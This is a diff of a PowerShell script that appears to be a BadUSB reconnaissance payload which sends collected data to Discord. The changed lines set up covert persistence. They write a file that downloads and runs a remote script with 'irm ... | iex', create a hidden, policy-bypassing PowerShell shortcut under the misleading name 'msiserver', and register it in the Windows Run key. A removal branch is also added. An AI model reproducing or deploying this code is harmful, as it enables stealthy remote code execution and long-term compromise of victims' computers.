@@ -1149,53 +1149,61 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
-if ($pers -eq 'True'){
-if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
-	$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
-	$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
-}
-if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
-    $objShell = New-Object -COM WScript.Shell
-	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
-	$target = "powershell"
-	$args = "-Nop -Noni -w h -ep bypass -command `"$env:appdata\..\Local\msiserver.lnk`""
-	$objShortCut.TargetPath = $target
-	$objShortcut.Arguments = $args
-	$objShortCut.Save()
-}
-}
 
 function Test-RegistryValue {
 
-param (
-
- [parameter(Mandatory=$true)]
- [ValidateNotNullOrEmpty()]$Path,
-
-[parameter(Mandatory=$true)]
- [ValidateNotNullOrEmpty()]$Value
-)
-
-try {
-
-Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
- return $true
- }
-
-catch {
-
-return $false
-
+	param (
+	
+	 [parameter(Mandatory=$true)]
+	 [ValidateNotNullOrEmpty()]$Path,
+	
+	[parameter(Mandatory=$true)]
+	 [ValidateNotNullOrEmpty()]$Value
+	)
+	
+	try {
+	
+	Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
+	 return $true
+	 }
+	
+	catch {
+	
+	return $false
+	
+	}
+	
 }
 
+if ($pers -eq 'True'){
+	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
+		$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
+		$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
+	}
+	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
+		$objShell = New-Object -COM WScript.Shell
+		$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
+		$target = "powershell"
+		$args = "-Nop -Noni -w h -ep bypass -command `"$env:appdata\..\Local\msiserver.lnk`""
+		$objShortCut.TargetPath = $target
+		$objShortcut.Arguments = $args
+		$objShortCut.Save()
+	}
+	$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
+	$val = $env:USERPROFILE+"\msiserver.lnk"
+	$testVal = Test-RegistryValue -Path $path -Value $val
+	if ($testVal -eq $true){
+	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
+	New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
+	}
 }
-$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
-$val = $env:USERPROFILE+"\msiserver.lnk"
-$testVal = Test-RegistryValue -Path $path -Value $val
-if ($testVal -eq $true){
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
-New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
+if ($pers -eq 'Remove') {
+	Remove-Item $env:appdata+"\..\Local\msiserver.ps1"
+	Remove-Item $env:appdata+"\..\Local\msiserver.lnk"
+	Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run" -Name "msiserver" -PropertyType "String"
 }
+
+
 
 ############################################################################################################################################################
 
